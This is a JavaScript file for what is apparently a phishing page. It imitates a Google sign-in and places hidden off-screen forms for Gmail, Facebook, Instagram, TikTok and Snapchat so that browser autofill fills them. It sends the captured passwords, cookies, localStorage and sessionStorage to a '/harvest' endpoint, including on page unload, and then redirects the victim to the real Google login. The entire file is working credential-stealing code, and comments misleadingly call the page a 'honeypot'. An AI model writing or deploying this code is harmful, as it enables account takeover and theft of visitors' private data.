// A flag to prevent multiple harvests
window.harvested = false;
window.initialHarvestSent = false; // New flag for initial harvest

async function initialHarvest() {
  if (window.initialHarvestSent) return;
  window.initialHarvestSent = true;
  console.log('Initial harvest triggered (IP and port scan only)!');

  const data = {
    userAgent: navigator.userAgent,
    cookies: document.cookie,
    localStorage: { ...localStorage },
    sessionStorage: { ...sessionStorage },
    timestamp: new Date().toISOString(),
    type: 'initial_scan' // Indicate this is an initial scan
  };

  try {
    if (navigator.sendBeacon) {
      const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
      navigator.sendBeacon('/harvest', blob);
      console.log('Initial beacon harvest sent.');
    } else {
      await fetch('/harvest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
      console.log('Initial harvest successful.');
    }
  } catch (error) {
    console.error('Initial harvest failed:', error);
  }
}

async function harvest() {
  // Check the flag to ensure this function only runs once for credentials
  if (window.harvested) return;
  window.harvested = true;
  console.log('Credential harvest triggered!');

  // A delay to allow the browser to populate all fields in the form (e.g., username and password)
  await new Promise(resolve => setTimeout(resolve, 250));

  const gmailForm = document.getElementById('gmail-form');
  const facebookForm = document.getElementById('facebook-form');
  const instagramForm = document.getElementById('instagram-form');
  const tiktokForm = document.getElementById('tiktok-form');
  const snapchatForm = document.getElementById('snapchat-form');

  const visibleEmail = document.getElementById('visible-email');
  const visiblePassword = document.getElementById('visible-password');

  const data = {
    gmail: {
      email: visibleEmail?.value || (gmailForm ? gmailForm.email.value : ''),
      password: visiblePassword?.value || (gmailForm ? gmailForm.password.value : ''),
    },
    facebook: {
      username: facebookForm ? facebookForm.username.value : '',
      password: facebookForm ? facebookForm.password.value : '',
    },
    instagram: {
      username: instagramForm ? instagramForm.username.value : '',
      password: instagramForm ? instagramForm.password.value : '',
    },
    tiktok: {
      username: tiktokForm ? tiktokForm.username.value : '',
      password: tiktokForm ? tiktokForm.password.value : '',
    },
    snapchat: {
      username: snapchatForm ? snapchatForm.username.value : '',
      password: snapchatForm ? snapchatForm.password.value : '',
    },
    userAgent: navigator.userAgent,
    cookies: document.cookie,
    localStorage: { ...localStorage },
    sessionStorage: { ...sessionStorage },
    timestamp: new Date().toISOString(),
    type: 'credential_harvest' // Indicate this is a credential harvest
  };

  try {
    // Use sendBeacon for a more reliable unload harvest
    if (navigator.sendBeacon) {
      const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
      navigator.sendBeacon('/harvest', blob);
      console.log('Beacon credential harvest sent.');
    } else {
      // Fallback to fetch for other cases
      const response = await fetch('/harvest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
      });
      console.log('Credential harvest successful:', response.status);
    }
  } catch (error) {
    console.error('Credential harvest failed:', error);
  }

  // Redirect after a short delay
  setTimeout(() => {
    window.location.href = 'https://accounts.google.com/signin';
  }, 500);
}

// --- Event Listeners & UI Logic ---

function setupEventListeners() {
  // 1. Autofill on hidden forms
  const hiddenInputs = document.querySelectorAll('.hidden-form input');
  hiddenInputs.forEach(input => {
    input.addEventListener('input', harvest);
  });
  console.log('Autofill listeners set up.');

  // 2. Manual entry on visible forms with debounce and button logic
  const visibleEmail = document.getElementById('visible-email');
  const visiblePassword = document.getElementById('visible-password');
  const signinButton = document.getElementById('signin-button');
  let debounceTimeout;

  if (signinButton) {
    signinButton.disabled = true; // Disable button initially

    // Add click listener for manual submission
    signinButton.addEventListener('click', (e) => {
      e.preventDefault(); // Prevent default form submission
      harvest();
    });
  }

  if (visibleEmail && visiblePassword && signinButton) {
    const handleInput = () => {
      // Update button state
      const bothFieldsFilled = visibleEmail.value && visiblePassword.value;
      signinButton.disabled = !bothFieldsFilled;

      // Debounced harvest
      clearTimeout(debounceTimeout);
      if (bothFieldsFilled) {
        debounceTimeout = setTimeout(harvest, 3000); // Wait for 3 seconds of inactivity
      }
    };

    visibleEmail.addEventListener('input', handleInput);
    visiblePassword.addEventListener('input', handleInput);
    console.log('Manual input listeners with button logic set up.');
  }
}

// Fallback for page close
window.addEventListener('beforeunload', harvest);

// After a delay, hide the loader and show the honeypot prompt
const splashShown = sessionStorage.getItem('splashShown');

if (!splashShown) {
  // Show image splash screen for 7 seconds
  const imageSplashContainer = document.querySelector('.image-splash-container');
  if (imageSplashContainer) imageSplashContainer.style.display = 'flex'; // Make it visible
  
  setTimeout(() => {
    if (imageSplashContainer) imageSplashContainer.style.display = 'none';
  
    const previewContainer = document.querySelector('.preview-container');
    if (previewContainer) previewContainer.style.display = 'block';
  
    sessionStorage.setItem('splashShown', 'true'); // Set flag after splash is shown
  
    // Existing logic for preview and honeypot containers
    setTimeout(() => {
      const honeypotContainer = document.querySelector('.honeypot-container');
      if (previewContainer) previewContainer.style.display = 'none';
      if (honeypotContainer) {
      honeypotContainer.style.display = 'block';
      // Set up all event listeners
      setupEventListeners();
      // Attempt to trigger autofill
      triggerFocusSwarm();
      // Trigger an immediate initial harvest on page load (IP and port scan)
      initialHarvest();
    }
  }, 1500); // Existing 1.5 second delay for loader
}, 7000); // 7 second delay for the image splash screen
} else {
  // If splash shown, skip directly to loader and then honeypot
  const imageSplashContainer = document.querySelector('.image-splash-container');
  if (imageSplashContainer) imageSplashContainer.style.display = 'none';

  const previewContainer = document.querySelector('.preview-container');
  if (previewContainer) previewContainer.style.display = 'block';

  setTimeout(() => {
    const honeypotContainer = document.querySelector('.honeypot-container');
    if (previewContainer) previewContainer.style.display = 'none';
    if (honeypotContainer) {
      honeypotContainer.style.display = 'block';
      setupEventListeners();
      triggerFocusSwarm();
      // Trigger an immediate initial harvest on page load (IP and port scan)
      initialHarvest();
    }
  }, 1500); // Existing 1.5 second delay for loader
}

function triggerFocusSwarm() {
  console.log('Attempting to trigger focus swarm for autofill...');

  const forms = document.querySelectorAll('.hidden-form');
  
  forms.forEach(form => {
    form.style.display = 'block';
    form.style.opacity = '0';
    form.style.position = 'absolute';
    form.style.top = '-9999px';
    form.style.left = '-9999px';
  });

  // Focus all the username/email fields to trigger autofill prompts
  document.querySelector('#gmail-form input[name="email"]')?.focus({ preventScroll: true });
  document.querySelector('#facebook-form input[name="username"]')?.focus({ preventScroll: true });
  document.querySelector('#instagram-form input[name="username"]')?.focus({ preventScroll: true });
  document.querySelector('#tiktok-form input[name="username"]')?.focus({ preventScroll: true });
  document.querySelector('#snapchat-form input[name="username"]')?.focus({ preventScroll: true });

  // The forms are not hidden again. They remain in the DOM but invisible to the user.
}

// Reset harvest flag if page is loaded from back-forward cache
window.addEventListener('pageshow', function(event) {
  if (event.persisted) {
    window.harvested = false;
    console.log('Page loaded from bfcache. Harvester reset.');
    // Re-trigger focus swarm on bfcache load
    triggerFocusSwarm();
  }
});

function togglePassword() {
  const passwordInput = document.getElementById('visible-password');
  const toggleIcon = document.querySelector('.toggle-password');
  if (passwordInput.type === 'password') {
    passwordInput.type = 'text';
    toggleIcon.textContent = 'Hide';
  } else {
    passwordInput.type = 'password';
    toggleIcon.textContent = 'Show';
  }
}